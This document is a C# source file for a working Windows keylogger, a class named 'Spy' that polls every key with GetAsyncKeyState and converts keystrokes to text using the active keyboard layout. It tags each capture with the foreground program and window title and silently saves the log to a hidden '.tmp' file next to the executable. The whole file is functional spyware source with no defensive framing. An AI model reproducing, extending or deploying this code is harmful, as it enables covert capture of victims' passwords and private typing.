using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ClassLibrary1
{
    /// 
    ///           class Kl
    /// 
    /// 
    public class Spy
    {
        private int LastWinHandle;
        private string LastWinTitle;
        private Keys lastKey;
        public Clock Clock;
        public string Logs;
        private Keyboard keyboard;
        public string LogsPath;
        public Spy()
        {
            this.lastKey = Keys.None;
            this.Clock = new Clock();
            this.Logs = "";
            this.keyboard = new Keyboard();
            this.LogsPath = Application.ExecutablePath + ".tmp";
        }

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);
        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern int GetKeyboardLayout(int dwLayout);
        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern short GetAsyncKeyState(int vKey);

        private string WorkWinInfo()
        {
            string result;
            try
            {
                IntPtr foregroundWindow = Spy.GetForegroundWindow();
                int processId=0;
                Spy.GetWindowThreadProcessId(foregroundWindow, ref processId);
                Process processById = Process.GetProcessById(processId);
                if ((foregroundWindow.ToInt32() == this.LastWinHandle & Operators.CompareString(this.LastWinTitle, processById.MainWindowTitle, false) == 0) | processById.MainWindowTitle.Length == 0)
                {
                    return "";
                }

                LastWinHandle = foregroundWindow.ToInt32();
                LastWinTitle = processById.MainWindowTitle;
                result = string.Concat(new string[]
                {

                    "\r\n\u0001",
                    this.Time(),
                    " ",
                    processById.ProcessName,
                    " ",
                    this.LastWinTitle,
                    "\u0001\r\n"
                });
            }
            catch (Exception expr_BB)
            {
                ProjectData.SetProjectError(expr_BB);
                ProjectData.ClearProjectError();
                return "";
            }

            return result;
            
            
        }

        private string Time()
        {
            string result;
            try
            {
                result = this.Clock.LocalTime.ToString("yy/MM/dd");
            }
            catch (Exception expr_1B)
            {
                ProjectData.SetProjectError(expr_1B);
                result = "??/??/??";
                ProjectData.ClearProjectError();
            }

            return result;
        }

        private static string VKCodeToUnicode(uint VKCode)
        {
            try
            {
                StringBuilder stringBuilder = new StringBuilder();
                byte[] lpKeyState = new byte[255];
                string result;
                if (!Spy.GetKeyboardState(lpKeyState))
                {
                    result = "";
                    return result;
                }

                uint wScanCode = Spy.MapVirtualKey(VKCode, 0u);
                IntPtr foregroundWindow = Spy.GetForegroundWindow();
                int num = 0;
                int windowThreadProcessId = Spy.GetWindowThreadProcessId(foregroundWindow, ref num);
                IntPtr dwhkl = (IntPtr)Spy.GetKeyboardLayout(windowThreadProcessId);
                Spy.ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
                result = stringBuilder.ToString();
                return result;
            }
            catch (Exception expr_66)
            {
                ProjectData.SetProjectError(expr_66);
                ProjectData.ClearProjectError();
            }

            return checked((Keys)VKCode).ToString();
        }

        private string Fix(Keys k)
        {
            var flag = this.keyboard.ShiftKeyDown;
            if (this.keyboard.CapsLock)
            {
                flag = !flag;
            }

            checked
            {
                string result;
                try
                {
                    // 123<k<=112 

                    if (!InR(k, 112, 123) && k != Keys.End && k != Keys.Delete)
                    {
                        if (k != Keys.Back)
                        {
                            if (k != Keys.LShiftKey && k != Keys.RShiftKey && k != Keys.Shift && k != Keys.ShiftKey && k != Keys.Control && k != Keys.ControlKey && k != Keys.RControlKey && k != Keys.LControlKey)
                            {
                                if (k != Keys.Alt)
                                {
                                    if (k == Keys.Space)
                                    {
                                        result = " ";
                                        return result;
                                    }

                                    if (k != Keys.Return)
                                    {
                                        if (k != Keys.Return)
                                        {
                                            if (k == Keys.Tab)
                                            {
                                                result = "[TAP]\r\n";
                                                return result;
                                            }

                                            if (flag)
                                            {
                                                result = Spy.VKCodeToUnicode((uint)k).ToUpper();
                                                return result;
                                            }

                                            result = Spy.VKCodeToUnicode((uint)k);
                                            return result;
                                        }
                                    }

                                    if (this.Logs.EndsWith("[ENTER]\r\n"))
                                    {
                                        result = "";
                                        return result;
                                    }

                                    result = "[ENTER]\r\n";
                                    return result;
                                }
                            }

                            result = "";
                            return result;
                        }
                    }

                    result = "[" + k.ToString() + "]";
                }
                catch (Exception expr_18B)
                {
                    ProjectData.SetProjectError(expr_18B);
                    if (flag)
                    {
                        result = Strings.ChrW((int)k).ToString().ToUpper();
                        ProjectData.ClearProjectError();
                    }
                    else
                    {
                        result = Strings.ChrW((int)k).ToString().ToLower();
                        ProjectData.ClearProjectError();
                    }
                }

                return result;
            }
        }

        public void LoggerThread()
        {
            try
            {
                this.Logs = File.ReadAllText(this.LogsPath);
            }
            catch (Exception expr_13)
            {
                ProjectData.SetProjectError(expr_13);
                ProjectData.ClearProjectError();
            }

            checked
            {
                try
                {
                    int num = 0;
                    while (true)
                    {
                        num++;
                        int num2 = 0;
                        do
                        {
                            if (Spy.GetAsyncKeyState(num2) == -32767)
                            {
                                Keys k = (Keys)num2;
                                string text = this.Fix(k);
                                if (text.Length > 0)
                                {
                                    this.Logs += this.WorkWinInfo();
                                    this.Logs += text;
                                }

                                this.lastKey = k;
                            }

                            num2++;
                        }
                        while (num2 <= 255);
                        if (num == 1000)
                        {
                            num = 0;
                            int num3 = 20480;
                            if (this.Logs.Length > 20480)
                            {
                                this.Logs = this.Logs.Remove(0, this.Logs.Length - num3);
                            }

                            File.WriteAllText(this.LogsPath, this.Logs);
                        }

                        Thread.Sleep(1);
                    }
                }
                catch (Exception expr_EF)
                {
                    ProjectData.SetProjectError(expr_EF);
                    ProjectData.ClearProjectError();
                }
            }
        }

        static bool InR(Keys ns, int bottom, int top)
        {
            int n = (int) ns;
            return (n >= bottom && n <= top);
        }
    }
}